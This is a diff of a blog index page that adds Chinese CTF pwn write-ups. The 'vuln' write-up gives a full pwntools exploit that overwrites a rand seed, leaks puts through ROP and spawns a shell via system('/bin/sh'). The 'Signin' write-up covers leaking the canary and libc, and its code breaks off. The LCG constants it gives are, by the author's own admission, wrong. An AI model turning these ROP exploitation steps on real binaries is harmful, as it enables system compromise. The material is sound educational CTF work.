@@ -172,7 +172,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -183,7 +183,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">10</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -200,6 +200,253 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2025/12/10/2025-12-16-Vuln-Random-Seed/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/12/10/2025-12-16-Vuln-Random-Seed/" class="post-title-link" itemprop="url">CTF题解：vuln</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-12-10 13:56:00" itemprop="dateCreated datePublished" datetime="2025-12-10T13:56:00+08:00">2025-12-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-01-30 11:55:06" itemprop="dateModified" datetime="2026-01-30T11:55:06+08:00">2026-01-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="Vuln-Random-Seed"><a href="#Vuln-Random-Seed" class="headerlink" title="Vuln-Random-Seed"></a>Vuln-Random-Seed</h1><h2 id="一、程序分析"><a href="#一、程序分析" class="headerlink" title="一、程序分析"></a>一、程序分析</h2><p><img src="/images/25-12-16-week1-Random-Seed/checksec.png" alt="image-20251210140132788"></p>
+<p>checksec发现没有pie和canary</p>
+<p><img src="/images/25-12-16-week1-Random-Seed/vuln.png" alt="image-20251216222334910"></p>
+<p><img src="/images/25-12-16-week1-Random-Seed/myread.png" alt="屏幕截图 2025-12-16 222245"></p>
+<p>浏览主要的反编译，只有在 myread 里有足够的溢出空间允许构造ROP链，但是我们需要猜测 rand （就是FUN_00401120函数）值99次，且不能有错，才能进入 myread。</p>
+<p>我们看一下代码中的关键部分：</p>
+<p><img src="/images/25-12-16-week1-Random-Seed/seed.png" alt="image-20251218103821063"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">undefined1 local_1a [<span class="number">10</span>];  <span class="comment">// 10字节的数组</span></span><br><span class="line">uint local_c;              <span class="comment">// 4字节的变量，存储了种子</span></span><br><span class="line"><span class="type">time_t</span> tVar2 = time((<span class="type">time_t</span> *)<span class="number">0x0</span>); <span class="comment">// 获取当前时间（即时间戳）</span></span><br><span class="line">local_c = (uint)tVar2;    <span class="comment">// 将时间戳赋值给local_c</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>, local_1a, <span class="number">0x12</span>);  <span class="comment">// 从用户输入读取18字节到local_1a</span></span><br><span class="line">srand(local_c);  <span class="comment">// 用local_c作为种子初始化随机数生成器</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>local_1a</code>只有10字节，但程序尝试从输入中读取18字节，这就会导致缓冲区溢出。栈布局，<code>local_1a</code>数组后面会紧跟着<code>local_c</code>。</li>
+<li><strong>如何判断<code>local_1a</code>是否会覆盖<code>local_c</code>？</strong><ul>
+<li><code>local_1a</code>的数组大小为10字节，<code>read(0, local_1a, 0x12)</code>读取了18字节数据，意味着超过10字节的部分会覆盖<code>local_1a</code>后的内存。</li>
+<li><code>local_c</code>是4字节的变量，它紧跟在<code>local_1a</code>后面（假设栈是按从高地址到低地址的顺序存储局部变量）。</li>
+<li>因此，当<code>read</code>读取18字节时，前10字节会填满<code>local_1a</code>，剩下的8字节（18-10&#x3D;8字节）将覆盖<code>local_c</code>。</li>
+</ul>
+</li>
+</ul>
+<p>通过这种缓冲区溢出，攻击者就可以控制<code>local_c</code>的值。由于<code>local_c</code>被用作<code>time(NULL)</code>的返回值（即当前时间的时间戳），因此攻击者可以通过覆盖<code>local_c</code>来控制随机数生成器的种子。</p>
+<p><em>深入了解时间戳、随机数生成、种子</em></p>
+<blockquote>
+<h3 id="1-时间戳（Timestamp）"><a href="#1-时间戳（Timestamp）" class="headerlink" title="1. 时间戳（Timestamp）"></a>1. <strong>时间戳（Timestamp）</strong></h3><p><strong>时间戳</strong>通常表示特定时间点的整数。常见时间戳是<strong>Unix时间戳</strong>，表示从1970年1月1日（协调世界时，UTC）00:00:00到当前时间的秒数。</p>
+<ul>
+<li><strong>Unix时间戳</strong>的特点：<ul>
+<li>是递增的数值，表示从1970年1月1日00:00:00 UTC到某个时刻经过的秒数。</li>
+<li>是整数，单位是秒。它对于系统时间管理和计算机应用非常重要。</li>
+<li>Unix时间戳通常被存储为一个32位或64位的整数。</li>
+</ul>
+</li>
+</ul>
+<p>例，Unix时间戳可能是 <code>1637220400</code>（即2021年11月10日00:00:00 UTC的秒数）。</p>
+<p>C语言中，我们可以使用标准库中的<code>time()</code>函数来获取当前的时间戳。</p>
+<h3 id="2-time-函数"><a href="#2-time-函数" class="headerlink" title="2. time() 函数"></a>2. <strong><code>time()</code> 函数</strong></h3><p>用于获取当前的时间戳。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time_t time(time_t *t);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>参数：</strong></p>
+<ul>
+<li><code>t</code>：指向 <code>time_t</code> 类型的指针，如果传入 <code>NULL</code>，<code>time()</code> 会返回当前时间戳的值。</li>
+<li>如果传入一个有效指针，<code>time()</code> 会将当前时间戳赋值给该指针指向的内存位置。</li>
+</ul>
+</li>
+<li><p><strong>返回值：</strong></p>
+<ul>
+<li>返回从UTC到当前时间的秒数，类型为 <code>time_t</code>（通常是一个长整型）。</li>
+<li>如果发生错误，返回 <code>(time_t)(-1)</code>。</li>
+</ul>
+</li>
+<li><p><strong>示例：</strong></p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;time.h&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span>()</span> &#123;</span><br><span class="line">    time_t t;</span><br><span class="line">    time(&amp;t);  <span class="comment">// 获取当前时间戳</span></span><br><span class="line">    printf(<span class="string">&quot;Current timestamp: %ld\n&quot;</span>, t);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Current</span> <span class="type">timestamp</span>: <span class="number">1637220400</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="3-srand-函数与随机数种子"><a href="#3-srand-函数与随机数种子" class="headerlink" title="3. srand() 函数与随机数种子"></a>3. <strong><code>srand()</code> 函数与随机数种子</strong></h3><p>用于设置伪随机数生成器的种子。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void srand(unsigned int seed);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>参数：</strong></p>
+<ul>
+<li><p><code>seed</code>：用于初始化伪随机数生成器的种子，它是一个<strong>无符号整数</strong>。</p>
+</li>
+<li><p><code>srand()</code> 没有返回值。</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>工作原理：</strong></p>
+<ul>
+<li><p><code>srand()</code> 会将提供的 <code>seed</code> 值传递给随机数生成器（通常是线性同余生成器）。从这时起，程序中所有的 <code>rand()</code> 调用都会基于这个种子值生成伪随机数。</p>
+</li>
+<li><p>如果你多次运行相同的程序并传递相同的种子值，那么每次调用 <code>rand()</code> 时会生成相同的随机数序列。</p>
+</li>
+<li><p><strong>为什么要使用种子？</strong></p>
+<ul>
+<li><strong>重现性</strong>：种子值确保了你可以控制随机数生成的起始状态。如果你用相同的种子多次运行程序，你得到的随机数序列是一样的。（对于调试和测试非常重要）</li>
+<li><strong>随机性</strong>：如果不设置种子，<code>rand()</code> 的结果通常是不可预测的，因为它可能会<em>以某种固定方式生成随机数序列，导致每次运行时生成相同的随机数</em>。</li>
+</ul>
+</li>
+<li><p><strong>示例：</strong></p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;time.h&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span>()</span> &#123;</span><br><span class="line">    srand(time(NULL));  <span class="comment">// 用当前时间作为种子初始化随机数生成器</span></span><br><span class="line">    printf(<span class="string">&quot;Random number: %d\n&quot;</span>, rand());  <span class="comment">// 生成一个随机数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>使用 <code>time(NULL)</code> 作为种子</strong>：<ul>
+<li><code>time(NULL)</code> 会返回当前的时间戳（当前秒数）。每次程序运行时，<code>time(NULL)</code> 都会返回不同的值，这样就能确保每次生成不同的随机数序列。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h2 id="二、调试过程"><a href="#二、调试过程" class="headerlink" title="二、调试过程"></a>二、调试过程</h2><p>我们查看 disas main 尝试分析一下栈布局以及种子</p>
+<p><img src="/images/25-12-16-week1-Random-Seed/dismain.png" alt="image-20251218102848053"></p>
+<p>这里有两个重要信息：</p>
+<ul>
+<li><p>seed &#x2F; 时间戳</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call time@plt</span><br><span class="line">mov  DWORD PTR [rbp-0x4], eax</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>缓冲区 local_1a</p>
+</li>
+</ul>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea rax, [rbp-0x12]</span><br><span class="line">mov edx, 0x12</span><br><span class="line">call read</span><br></pre></td></tr></table></figure>
+
+<p>所以，种子 local_c 在 rbp - 0x4 处，数组起始地址在 rbp - 0x12 处。</p>
+<p>计算一下栈布局</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rbp</span>+<span class="number">0</span>x8   ← 返回地址</span><br><span class="line"><span class="built_in">rbp</span>       ← old <span class="built_in">rbp</span></span><br><span class="line"><span class="literal">--------------------------------</span></span><br><span class="line"><span class="built_in">rbp</span><span class="literal">-0x4</span>   ← local_c (seed, <span class="number">4</span>字节)</span><br><span class="line"><span class="built_in">rbp</span><span class="literal">-0x8</span>   ← local_10</span><br><span class="line"><span class="built_in">rbp</span><span class="literal">-0x12</span>  ← local_1a[?]</span><br><span class="line"><span class="built_in">rbp</span><span class="literal">-0x18</span>  ← local_20</span><br><span class="line"><span class="literal">--------------------------------</span></span><br><span class="line">rsp = <span class="built_in">rbp</span><span class="literal">-0x20</span></span><br></pre></td></tr></table></figure>
+
+<p>所以读取0x12（18）字节溢出，最后0x4字节就可以覆盖seed</p>
+<p>那么，seed变成0后，rand会基于0生成伪随机数，下面看一下rand() 是如何生成伪随机数的</p>
+<blockquote>
+<h3 id="rand-的实现"><a href="#rand-的实现" class="headerlink" title="rand() 的实现"></a><code>rand()</code> 的实现</h3><p><code>rand()</code> 是一个伪随机数生成器（PRNG，Pseudorandom Number Generator）。它基于一个种子来生成随机数。每当程序运行时，如果没有显式设置种子，系统通常会将种子设置为 0，或者如果程序调用了 <code>srand(0)</code>，种子就会是 0。</p>
+<p>当种子固定时，<code>rand()</code> 返回的伪随机数是固定的，具体的随机数序列是由 PRNG 的算法和初始种子共同决定的。</p>
+<h3 id="C-标准库中的-rand-函数"><a href="#C-标准库中的-rand-函数" class="headerlink" title="C 标准库中的 rand() 函数"></a>C 标准库中的 <code>rand()</code> 函数</h3><p>大多数系统中，<code>rand()</code> 的实现基于 <strong>线性同余生成器（LCG，Linear Congruential Generator）</strong> 算法。它的计算公式通常是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Xn+1 = (a * Xn + c) % m</span><br></pre></td></tr></table></figure>
+
+<p>其中：</p>
+<ul>
+<li><code>Xn</code> 是当前的随机数状态。</li>
+<li><code>a</code>, <code>c</code>, <code>m</code> 是一些常数，这些常数会根据系统和标准库的实现不同而有所差异。</li>
+<li><code>Xn+1</code> 就是下一个伪随机数。</li>
+</ul>
+<p>对于 <strong>glibc</strong>（GNU C 库），<code>rand()</code> 使用的常数是：</p>
+<ul>
+<li><code>a = 0x343fd44f</code></li>
+<li><code>c = 0x4a2d2b9b</code></li>
+<li><code>m = 2^32</code></li>
+</ul>
+<h3 id="解析种子为-0-时-rand-的返回值"><a href="#解析种子为-0-时-rand-的返回值" class="headerlink" title="解析种子为 0 时 rand() 的返回值"></a>解析种子为 0 时 <code>rand()</code> 的返回值</h3><ol>
+<li><p><strong>第一次调用 <code>rand()</code>：</strong><br> 当 <code>rand()</code> 第一次被调用时，<strong>当前状态 <code>X0</code> 是 0</strong>，所以根据上面的公式来计算 <code>X1</code>（即 <code>rand()</code> 的返回值）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X1 = (0x343fd44f * 0 + 0x4a2d2b9b) % 2^32</span><br><span class="line">X1 = 0x4a2d2b9b % 2^32</span><br><span class="line">X1 = 0x4a2d2b9b</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>转换为整数：</strong><br> <code>rand()</code> 返回的值是 <code>X1</code>，即 <code>0x4a2d2b9b</code>，它是一个 32 位的无符号整数。</p>
+</li>
+<li><p><strong>取模操作：</strong><br> 接下来，程序在代码中执行了 <code>rand() % 100 + 1</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">local_10 = rand() % 100 + 1;</span><br></pre></td></tr></table></figure>
+
+<p>将 <code>0x4a2d2b9b</code> 转换为十进制：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x4a2d2b9b = 1241046859</span><br></pre></td></tr></table></figure>
+
+<p>对 100 取模：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1241046859 % 100 = 59</span><br></pre></td></tr></table></figure>
+
+<p>然后再加 1：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">local_10 = 59 + 1 = 60</span><br></pre></td></tr></table></figure></li>
+</ol>
+</blockquote>
+<p>当然，上面这种算法计算比较困难（并且是错误的，只是作为原理演示），实际可以通过 gdb 调试确定，或者用 ctypes 直接调用同一个 libc（WP的方法），我们同样尝试一下这两种方法</p>
+<h4 id="1-gdb-调试验证"><a href="#1-gdb-调试验证" class="headerlink" title="1. gdb 调试验证"></a>1. gdb 调试验证</h4><p>首先，根据ABI， <code>rand()</code> 的返回值一定放在 <code>EAX / RAX</code> 寄存器里，而 gdb 可以直接读寄存器。</p>
+<p><img src="/images/25-12-16-week1-Random-Seed/cmp.png" alt="image-20251221114220959"></p>
+<p>可以看到，我们在 cmp 之前断点就可以看到比较的值，这里不再细说</p>
+<h4 id="2-ctypes-加载相同-libc"><a href="#2-ctypes-加载相同-libc" class="headerlink" title="2. ctypes 加载相同 libc"></a>2. ctypes 加载相同 libc</h4><p>rand() 算法和 libc 相关，只要使用相同的 libc 和种子，所得的伪随机数就相同。</p>
+<p>[^注意]: rand 的本质是一个<em>状态机</em>，<code>srand(0)</code> 只是把状态初始化为 <code>state0</code> <em>每调用一次 rand，状态就前进一步</em>，所以每一步的 rand 返回值是不同的，在脚本中必须走相同的步数（rand调用次数和原程序相同）</p>
+<p>之后就是典型的 ret2libc，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;154.94.237.159&#x27;,34894)</span></span><br><span class="line">p = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf  = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">lib = ctypes.CDLL(<span class="string">&#x27;./libc.so.6&#x27;</span>) <span class="comment"># ctypes 加载同一个 libc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lib.rand.restype = ctypes.c_int <span class="comment"># 设置返回类型（重要）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;tell me thy name.&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x12</span>) <span class="comment">#1. 覆盖 seed -&gt; 0</span></span><br><span class="line">lib.srand(<span class="number">0</span>) <span class="comment"># ctypes 同步 srand(0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):<span class="comment"># 2. 预测 99 次 rand</span></span><br><span class="line">    r = lib.rand()</span><br><span class="line">    guess = r % <span class="number">100</span> + <span class="number">1</span></span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please guess the number:&#x27;</span>, p64(guess))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. ROP 泄露 puts</span></span><br><span class="line">pop_rdi = <span class="number">0x401423</span></span><br><span class="line">myread  = <span class="number">0x40125D</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(myread)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Here&#x27;s a reward to thy brilliant mind.\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak = p.recvline().strip()</span><br><span class="line">addr = u64(leak.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">f&quot;puts leak: <span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc.address = addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&#x27;libc base = <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. getshell</span></span><br><span class="line">payload  = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -491,6 +738,109 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2025/12/07/2025-12-08-Signin/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/12/07/2025-12-08-Signin/" class="post-title-link" itemprop="url">CTF题解：Signin</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-12-07 20:00:00" itemprop="dateCreated datePublished" datetime="2025-12-07T20:00:00+08:00">2025-12-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-12-08 22:41:28" itemprop="dateModified" datetime="2025-12-08T22:41:28+08:00">2025-12-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h1><h2 id="一、思路"><a href="#一、思路" class="headerlink" title="一、思路"></a>一、思路</h2><p><img src="/images/signin/checksec.png" alt="image-20251201160105455"></p>
+<p><img src="/images/signin/vuln.png" alt="image-20251201192652962"></p>
+<p>checksec发现程序有pie和canary，并且有三处read可以溢出，至少需要两次泄露</p>
+<h2 id="二、步骤"><a href="#二、步骤" class="headerlink" title="二、步骤"></a>二、步骤</h2><h4 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h4><p>先泄露canary，canary一般在rbp前，用pwndbg调试，输入100个字符</p>
+<p><img src="/images/signin/step1.png" alt="image-20251201193149423"></p>
+<p>发现canary在偏移88处。因为canary最低位是\x00，并且printf会一直打印直到遇到空字符，所以我们可以输入89字节覆盖掉canary的\x00，printf就会将canary打印出来。</p>
+<h4 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h4><p>再泄露main基址，同上可知缓冲区56，再加上canary和rbp的16字节，共72字节，发送payload &#x3D; b’a’*72可以发现泄露了main+28的地址，由此可得main地址</p>
+<p><img src="/images/signin/step2.png" alt="image-20251201200253592"></p>
+<p><img src="C:\Users\WH\AppData\Roaming\Typora\typora-user-images\image-20251201200328810.png" alt="image-20251201200328810"></p>
+<h4 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h4><p>从反汇编中找到xor ebp,ebp偏移为0x1010e4，main偏移为</p>
+<p>0x10132b，利用第三次溢出覆盖返回地址为_start，重新运行</p>
+<p><img src="/images/signin/step3.png" alt="image-20251201201608418"></p>
+<p><img src="/images/signin/step33.png" alt="image-20251201201636606"></p>
+<h4 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h4><p>泄露libc基址。程序有调用puts，并且有pop rdi, ret，可以利用puts输出libc基址</p>
+<p><img src="/images/signin/step4.png" alt="image-20251201211613397"></p>
+<p>这里只是偏移，需要加上之前的基址。</p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span 